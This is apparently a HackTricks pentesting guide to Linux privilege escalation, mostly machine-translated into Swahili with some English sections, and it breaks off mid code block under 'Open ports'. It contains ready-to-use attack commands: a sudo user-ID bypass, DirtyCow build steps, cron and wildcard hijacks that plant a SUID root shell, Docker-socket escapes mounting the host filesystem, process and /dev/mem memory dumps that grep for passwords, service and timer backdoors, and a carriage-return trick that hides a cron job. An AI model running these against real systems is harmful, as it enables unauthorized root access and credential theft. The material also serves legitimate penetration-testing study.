# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

Hebu tuanze kupata maarifa kuhusu OS inayotumika
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una **idhini za kuandika kwenye folda yoyote ndani ya mabadiliko ya `PATH`** unaweza kuwa na uwezo wa kuingilia baadhi ya maktaba au binaries:
```bash
echo $PATH
```
### Env info

Habari za kuvutia, nywila au funguo za API katika mabadiliko ya mazingira?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia toleo la kernel na ikiwa kuna exploit ambayo inaweza kutumika kuongeza mamlaka
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zenye udhaifu na baadhi ya **exploits zilizokusanywa** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **exploits zilizokusanywa**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa toleo zote za kernel zenye udhaifu kutoka kwenye wavuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools ambazo zinaweza kusaidia kutafuta exploits za kernel ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (tekeleza KATIKA mwathirika, inachunguza exploits tu za kernel 2.x)

Daima **tafuta toleo la kernel katika Google**, labda toleo lako la kernel limeandikwa katika exploit fulani ya kernel na kisha utakuwa na uhakika kwamba exploit hii ni halali.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Kulingana na toleo la sudo lililo hatarini ambalo linaonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia kama toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kutoka @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi hii vuln inaweza kutumika.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi ya uainishaji wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodha ya ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya kontena la docker unaweza kujaribu kutoroka kutoka kwake:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Angalia **kitu gani kimewekwa na kisichoweza kuwekwa**, wapi na kwa nini. Ikiwa chochote hakijawa kimewekwa unaweza kujaribu kukiweka na kuangalia taarifa za kibinafsi.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu za Kusaidia

Taja binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **kila kompyuta imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia exploit ya kernel kwani inashauriwa kuikamilisha kwenye mashine ambayo unakusudia kuitumia (au kwenye moja inayofanana)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Uthibitisho Zilizowekwa

Angalia **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kwa ajili ya kupandisha mamlaka...\
Inapendekezwa kuangalia kwa mikono toleo la programu zinazoshukiwa zaidi zilizowekwa.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwa mashine, unaweza pia kutumia **openVAS** kuangalia programu zilizopitwa na wakati na zenye udhaifu zilizowekwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha habari nyingi ambazo kwa kawaida zitakuwa hazina maana, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au sawa na hiyo ambayo itakagua ikiwa toleo lolote la programu lililowekwa lina udhaifu kwa mashambulizi yanayojulikana._

## Mchakato

Angalia **michakato** ipi inatekelezwa na uangalie ikiwa mchakato wowote una **privilege zaidi kuliko inavyopaswa** (labda tomcat inatekelezwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia kwa [**electron/cef/chromium debuggers** zinazotembea, unaweza kuzitumia kuboresha mamlaka](electron-cef-chromium-debugger-abuse.md). **Linpeas** inagundua hizo kwa kuangalia parameter `--inspect` ndani ya mistari ya amri ya mchakato.\
Pia **angalia mamlaka yako juu ya binaries za michakato**, labda unaweza kuandika tena za mtu mwingine.

### Ufuatiliaji wa mchakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kutambua michakato dhaifu inayotekelezwa mara kwa mara au wakati seti ya mahitaji inakamilika.

### Kumbukumbu ya mchakato

Huduma zingine za seva huhifadhi **akili wazi ndani ya kumbukumbu**.\
Kwa kawaida utahitaji **mamlaka ya root** kusoma kumbukumbu ya michakato inayomilikiwa na watumiaji wengine, kwa hivyo hii kwa kawaida ni muhimu zaidi unapokuwa tayari root na unataka kugundua zaidi akili.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya michakato unayomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa default** ambayo inamaanisha huwezi kutupa michakato mingine inayomilikiwa na mtumiaji wako asiye na mamlaka.
>
> Faili _**/proc/sys/kernel/yama/ptrace_scope**_ inasimamia upatikanaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza kufuatiliwa, mradi tu zina uid sawa. Hii ndiyo njia ya kawaida jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: mchakato wa mzazi tu unaweza kufuatiliwa.
> - **kernel.yama.ptrace_scope = 2**: Ni admin tu anayeweza kutumia ptrace, kwani inahitaji uwezo wa CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna michakato inayoweza kufuatiliwa kwa ptrace. Mara ikipangwa, upya unahitajika ili kuwezesha ptracing tena.

#### GDB

Ikiwa una upatikanaji wa kumbukumbu ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani ya akili zake.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa kitambulisho maalum cha mchakato, **ramani zinaonyesha jinsi kumbukumbu inavyopangwa ndani ya nafasi ya anwani ya virtual ya mchakato huo**; pia inaonyesha **idhini za kila eneo lililopangwa**. Faili ya **mem** pseudo **inaonyesha kumbukumbu ya mchakato yenyewe**. Kutoka kwenye faili la **ramani** tunajua ni zipi **sehemu za kumbukumbu zinazoweza kusomwa** na offsets zao. Tunatumia taarifa hii **kutafuta ndani ya faili la mem na kutupa maeneo yote yanayoweza kusomwa** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` inatoa ufikiaji wa **kumbukumbu** halisi ya mfumo, si kumbukumbu ya virtual. Nafasi ya anwani ya virtual ya kernel inaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni toleo jipya la Linux la chombo cha ProcDump kutoka kwa seti ya zana za Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Ili kudump kumbukumbu ya mchakato unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mahitaji ya root kwa mikono na kudump mchakato unaomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials from Process Memory

#### Manual example

Ikiwa unapata kwamba mchakato wa uthibitishaji unafanya kazi:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza kutupa mchakato (angalia sehemu za awali ili kupata njia tofauti za kutupa kumbukumbu ya mchakato) na kutafuta akreditivu ndani ya kumbukumbu:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitachukua **akili za maandiko wazi kutoka kwenye kumbukumbu** na kutoka kwa **faili maarufu**. Kinahitaji ruhusa za mzizi ili kufanya kazi ipasavyo.

| Kipengele                                         | Jina la Mchakato     |
| ------------------------------------------------- | -------------------- |
| Nenosiri la GDM (Kali Desktop, Debian Desktop)    | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Mawasiliano ya FTP Yanayoendelea)        | vsftpd               |
| Apache2 (Mawasiliano ya HTTP Basic Auth Yanayoendelea) | apache2              |
| OpenSSH (Mawasiliano ya SSH Yanayoendelea - Matumizi ya Sudo) | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

Angalia kama kazi yoyote iliyopangwa ina udhaifu. Labda unaweza kunufaika na script inayotekelezwa na root (udhaifu wa wildcard? inaweza kubadilisha faili ambazo root inatumia? tumia symlinks? tengeneza faili maalum katika directory ambayo root inatumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" ana ruhusa za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji wa root anajaribu kutekeleza amri au script bila kuweka njia. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron kutumia skripti yenye wildcard (Wildcard Injection)

Ikiwa skripti inatekelezwa na root ina “**\***” ndani ya amri, unaweza kuitumia hii kufanya mambo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imeandamana na njia kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **haina hatari).**

Soma ukurasa ufuatao kwa mbinu zaidi za unyakuzi wa wildcard:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Kuandika tena skripti za Cron na symlink

Ikiwa **unaweza kubadilisha skripti ya cron** inayotekelezwa na root, unaweza kupata shell kwa urahisi:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa skripti inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, huenda ikawa na manufaa kufuta folda hiyo na **kuunda folda ya symlink kwa nyingine** inayohudumia skripti inayodhibitiwa na wewe.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Kazi za cron za mara kwa mara

Unaweza kufuatilia michakato ili kutafuta michakato inayotekelezwa kila dakika 1, 2 au 5. Huenda unaweza kunufaika na hilo na kupandisha mamlaka.

Kwa mfano, ili **kufuatilia kila 0.1s kwa dakika 1**, **panga kwa amri zilizotekelezwa kidogo** na futa amri ambazo zimekuwa zikitekelezwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itasimamia na kuorodhesha kila mchakato unaoanza).

### Kazi za cron zisizoonekana

Inawezekana kuunda kazi ya cron **kwa kuweka kurudi kwa gari baada ya maoni** (bila tabia ya newline), na kazi ya cron itafanya kazi. Mfano (angalia tabia ya kurudi kwa gari):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

Angalia kama unaweza kuandika faili zozote za `.service`, ikiwa unaweza, unaweza **kubadilisha** ili **itekeleze** backdoor yako wakati huduma inapo **anzishwa**, **kurejelewa** au **kusitishwa** (labda utahitaji kusubiri hadi mashine ireboot).\
Kwa mfano, tengeneza backdoor yako ndani ya faili .service na **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Kumbuka kwamba ikiwa una **idhini za kuandika juu ya binaries zinazotekelezwa na huduma**, unaweza kubadilisha hizo kuwa backdoors ili wakati huduma hizo zitakapotekelezwa tena, backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** na:
```bash
systemctl show-environment
```
Ikiwa unapata kwamba unaweza **kuandika** katika yoyote ya folda za njia hiyo unaweza kuwa na uwezo wa **kuinua mamlaka**. Unahitaji kutafuta **njia za uhusiano zinazotumika kwenye faili za usanidi wa huduma** kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** yenye **jina sawa na njia ya binary** ndani ya folda ya systemd PATH ambayo unaweza kuandika, na wakati huduma inapoombwa kutekeleza kitendo kilichohatarishwa (**Anza**, **Stop**, **Reload**), **backdoor yako itatekelezwa** (watumiaji wasio na haki mara nyingi hawawezi kuanzisha/kusitisha huduma lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu huduma kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni faili za kitengo cha systemd ambazo jina lake linamalizika na `**.timer**` ambazo zinadhibiti faili za `**.service**` au matukio. **Timers** zinaweza kutumika kama mbadala wa cron kwani zina msaada wa ndani kwa matukio ya wakati wa kalenda na matukio ya wakati wa monotonic na zinaweza kuendeshwa kwa njia isiyo ya sambamba.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Writable timers

Ikiwa unaweza kubadilisha timer unaweza kufanya iweze kutekeleza baadhi ya matukio ya systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika hati unaweza kusoma kuhusu nini Unit ni:

> Kitengo cha kuamsha wakati kipima muda hiki kinapokamilika. Hoja ni jina la kitengo, ambacho kiambishi chake si ".timer". Ikiwa hakijasemwa, thamani hii inarudi kwa huduma ambayo ina jina sawa na kitengo cha kipima muda, isipokuwa kwa kiambishi. (Tazama hapo juu.) Inapendekezwa kwamba jina la kitengo linaloamshwa na jina la kitengo cha kipima muda liwe sawa, isipokuwa kwa kiambishi.

Kwa hivyo, ili kutumia ruhusa hii unahitaji:

- Kupata kitengo fulani cha systemd (kama `.service`) ambacho kina **kikimbia binari inayoweza kuandikwa**
- Kupata kitengo fulani cha systemd ambacho kina **kikimbia njia ya uhusiano** na una **ruhusa za kuandika** juu ya **PATH ya systemd** (ili kujifanya kuwa hiyo executable)

**Jifunze zaidi kuhusu vipima muda na `man systemd.timer`.**

### **Kuwezesha Kipima Muda**

Ili kuwezesha kipima muda unahitaji ruhusa za mzizi na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hizi chaguzi ni tofauti lakini muhtasari unatumiwa ku **onyesha wapi itasikiliza** kwenye socket (njia ya faili la socket la AF_UNIX, IPv4/6 na/au nambari ya bandari ya kusikiliza, nk.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **kweli**, **kituo cha huduma kinazaliwa kwa kila muunganisho unaokuja** na socket ya muunganisho pekee inapitishwa kwake. Ikiwa **false**, sockets zote zinazolisikiliza zenyewe zinapitishwa kwa **kitengo cha huduma kilichozinduliwa**, na kitengo kimoja cha huduma kinazaliwa kwa muunganisho wote. Thamani hii inapuuziliwa mbali kwa sockets za datagram na FIFOs ambapo kitengo kimoja cha huduma kinashughulikia bila masharti trafiki yote inayokuja. **Inarudiwa kuwa false**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya tu kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Inachukua mistari moja au zaidi ya amri, ambazo zina **tekelezwa kabla** au **baada** ya **sockets**/FIFOs zinazolisikiliza ku **undwa** na kuunganishwa, mtawalia. Neno la kwanza la mstari wa amri lazima liwe jina la faili la moja kwa moja, kisha kufuatwa na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo zina **tekelezwa kabla** au **baada** ya **sockets**/FIFOs zinazolisikiliza ku **fungwa** na kuondolewa, mtawalia.
- `Service`: Inaelezea jina la **kitengo cha huduma** **kuanzisha** kwenye **trafiki inayokuja**. Mpangilio huu unaruhusiwa tu kwa sockets zenye Accept=no. Inarudi kwa huduma ambayo ina jina sawa na socket (ikiwa na kiambishi kilichobadilishwa). Katika hali nyingi, haitakuwa lazima kutumia chaguo hili.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
&#xNAN;_&#x4E;ote that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa moja kwa moja
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa unyakuzi:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### Soketi za HTTP

Kumbuka kwamba kunaweza kuwa na **soketi zinazotafuta maombi ya HTTP** (_Sizungumzii kuhusu faili za .socket bali faili zinazofanya kazi kama soketi za unix_). Unaweza kuangalia hii kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **inas respond na HTTP** ombi, basi unaweza **kuwasiliana** nayo na labda **kutumia udhaifu fulani**.

### Socket ya Docker inayoweza Kuandikwa

Socket ya Docker, mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa kawaida, inaweza kuandikwa na mtumiaji `root` na wanachama wa kundi la `docker`. Kuwa na ufikiaji wa kuandika kwenye socket hii kunaweza kusababisha kupanda vyeo. Hapa kuna muhtasari wa jinsi hii inaweza kufanyika na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Kupanda Vyeo kwa kutumia Docker CLI**

Ikiwa una ufikiaji wa kuandika kwenye socket ya Docker, unaweza kupanda vyeo kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### Others

Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa **mawasiliano kati ya michakato (IPC)** ambao unaruhusu programu kuingiliana kwa ufanisi na kushiriki data. Imeundwa kwa kuzingatia mfumo wa kisasa wa Linux, inatoa muundo thabiti kwa aina mbalimbali za mawasiliano ya programu.

Mfumo huu ni wa kubadilika, ukisaidia IPC ya msingi inayoboresha ubadilishanaji wa data kati ya michakato, ikikumbusha **sockets za UNIX zilizoboreshwa**. Aidha, inasaidia kutangaza matukio au ishara, ikichochea uunganisho usio na mshono kati ya vipengele vya mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu inayokuja inaweza kumfanya mpiga muziki kukatiza, kuboresha uzoefu wa mtumiaji. Zaidi ya hayo, D-Bus inasaidia mfumo wa vitu vya mbali, ikirahisisha maombi ya huduma na wito wa mbinu kati ya programu, ikipunguza michakato ambayo hapo awali ilikuwa ngumu.

D-Bus inafanya kazi kwa **mfumo wa ruhusa/kuzuia**, ikisimamia ruhusa za ujumbe (wito wa mbinu, utoaji wa ishara, n.k.) kulingana na athari ya jumla ya sheria za sera zinazolingana. Sera hizi zinaelezea mwingiliano na basi, na inaweza kuruhusu kupandisha mamlaka kupitia unyakuzi wa ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` unapatikana, ukielezea ruhusa za mtumiaji wa root kumiliki, kutuma na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera bila mtumiaji au kundi lililobainishwa zinafaa kwa ujumla, wakati sera za muktadha "default" zinafaa kwa wote ambao hawajafunikwa na sera nyingine maalum.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya kuhesabu na kutumia mawasiliano ya D-Bus hapa:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima ni ya kuvutia kuhesabu mtandao na kubaini nafasi ya mashine.

### Hesabu ya jumla
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Daima angalia huduma za mtandao zinazofanya kazi kwenye mashine ambayo hukuweza kuingiliana nayo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
